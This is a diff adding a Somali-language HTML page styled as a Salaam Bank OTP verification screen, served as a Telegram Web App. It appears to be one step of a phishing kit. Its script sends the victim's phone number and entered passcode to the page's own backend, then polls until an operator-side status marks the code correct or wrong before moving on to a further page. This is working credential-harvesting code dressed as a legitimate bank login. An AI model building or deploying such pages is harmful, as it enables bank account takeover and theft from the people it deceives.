@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Xaqiijinta Kodka Koowaad (OTP) - Salaam Bank</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #0d1b2a; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: 100vh;
+            overflow-x: hidden;
+            color: #e2e8f0;
+        }
+
+        .card { 
+            background: #1b2a4a; 
+            width: 90%; 
+            max-width: 400px; 
+            margin-top: 50px; 
+            padding: 40px 20px; 
+            border-radius: 20px; 
+            text-align: center; 
+            border: 1px solid #2a3d66;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.3); 
+            box-sizing: border-box;
+        }
+
+        h2 { font-size: 22px; color: #f8fafc; margin-bottom: 15px; font-weight: 700; }
+        .instruction { color: #94a3b8; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
+
+        .otp-group { 
+            display: flex; 
+            justify-content: center; 
+            gap: 12px; 
+            margin-bottom: 25px; 
+        }
+
+        .otp-input { 
+            width: 52px; 
+            height: 60px; 
+            border: 1.5px solid #334155; 
+            background-color: #0f172a;
+            color: #38bdf8;
+            border-radius: 10px; 
+            text-align: center; 
+            font-size: 24px; 
+            font-weight: bold; 
+            outline: none; 
+            transition: border-color 0.2s;
+        }
+
+        .otp-input:focus {
+            border-color: #38bdf8;
+        }
+
+        .resend-text { color: #64748b; font-size: 14px; margin-bottom: 25px; }
+
+        .btn-verify { 
+            background-color: #1e293b; 
+            color: #64748b; 
+            border: 1px solid #334155; 
+            width: 100%; 
+            padding: 18px; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: not-allowed;
+            transition: all 0.3s ease;
+        }
+
+        .btn-verify.active { 
+            background: linear-gradient(135deg, #003366 0%, #004080 100%); 
+            color: #f8fafc; 
+            border-color: #1e40af;
+            cursor: pointer; 
+        }
+
+        #loadingSection { display: none; }
+
+        .footer-wave { 
+            width: 100%; 
+            background: linear-gradient(135deg, #001f3f 0%, #002244 100%); 
+            padding: 40px 0;
+            margin-top: auto; 
+            text-align: center; 
+            color: #64748b;
+            font-size: 13px;
+            border-top: 1px solid #1e3a5f;
+        }
+
+        #errorBox {
+            color: #fca5a5;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="card" id="inputSection">
+    <h2>Xaqiijinta Kodka Koowaad (OTP)</h2>
+    <p class="instruction">Geli kodka 4-ta digit ah oo loo soo diray nambarkaaga telefoonka</p>
+
+    <div id="errorBox"></div>
+
+    <div class="otp-group">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+    </div>
+
+    <p class="resend-text">Kodu dib u dirid <span id="timer">60</span>s</p>
+
+    <button id="verifyBtn" class="btn-verify" onclick="handleVerification()" disabled>
+        XAQIIJI KODKA (OTP)
+    </button>
+</div>
+
+<div class="card" id="loadingSection">
+    <p style="color: #cbd5e1;">Fadlan sug...</p>
+</div>
+
+<div class="footer-wave">
+    <p>© 2026 Salaam Bank Somalia. Hantida oo dhan waa la dhowray.</p>
+</div>
+
+<script>
+const inputs = document.querySelectorAll('.otp-input');
+const verifyBtn = document.getElementById('verifyBtn');
+const inputSection = document.getElementById('inputSection');
+const loadingSection = document.getElementById('loadingSection');
+const timerText = document.getElementById('timer');
+const errorBox = document.getElementById('errorBox');
+
+let isSubmitting = false;
+
+window.onload = () => {
+    window.Telegram?.WebApp?.ready();
+    window.Telegram?.WebApp?.expand();
+
+    const phone = localStorage.getItem('phone');
+    if (!phone) {
+        errorBox.innerText = "Xilligii waa dhacay. Fadlan dib u gal.";
+        setTimeout(() => window.location.href = "/index.html", 1500);
+    }
+
+    startCountdown();
+};
+
+function startCountdown() {
+    let count = 60;
+    const interval = setInterval(() => {
+        timerText.innerText = count;
+        count--;
+        if (count < 0) clearInterval(interval);
+    }, 1000);
+}
+
+inputs.forEach((input, i) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
+        check();
+    });
+
+    input.addEventListener('keydown', (e) => {
+        if (e.key === "Backspace" && !input.value && i > 0) {
+            inputs[i - 1].focus();
+        }
+    });
+});
+
+function check() {
+    const filled = [...inputs].every(i => i.value.length === 1);
+    verifyBtn.disabled = !filled;
+    verifyBtn.classList.toggle('active', filled);
+}
+
+async function handleVerification() {
+    if (isSubmitting) return;
+
+    const phone = localStorage.getItem('phone');
+    if (!phone) return;
+
+    let otp = "";
+    inputs.forEach(i => otp += i.value);
+
+    isSubmitting = true;
+
+    inputSection.style.display = "none";
+    loadingSection.style.display = "block";
+    errorBox.innerText = "";
+
+    try {
+        await fetch('/api/verify-first-otp', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone, otp })
+        });
+
+        const poll = setInterval(async () => {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
+
+            if (data.status === "otp1_correct") {
+                clearInterval(poll);
+                localStorage.setItem("phone", phone);
+                window.location.href = "/page9";
+            }
+
+            if (data.status === "otp1_wrong") {
+                clearInterval(poll);
+
+                errorBox.innerText = "❌ Kodka OTP-ga waa magal. Fadlan geli kodka saxda ah.";
+
+                reset();
+            }
+
+        }, 2000);
+
+    } catch (err) {
+        console.error(err);
+        reset();
+    }
+}
+
+function reset() {
+    isSubmitting = false;
+    loadingSection.style.display = "none";
+    inputSection.style.display = "block";
+    inputs.forEach(i => i.value = "");
+    verifyBtn.disabled = true;
+    verifyBtn.classList.remove('active');
+}
+</script>
+
+</body>
+</html>
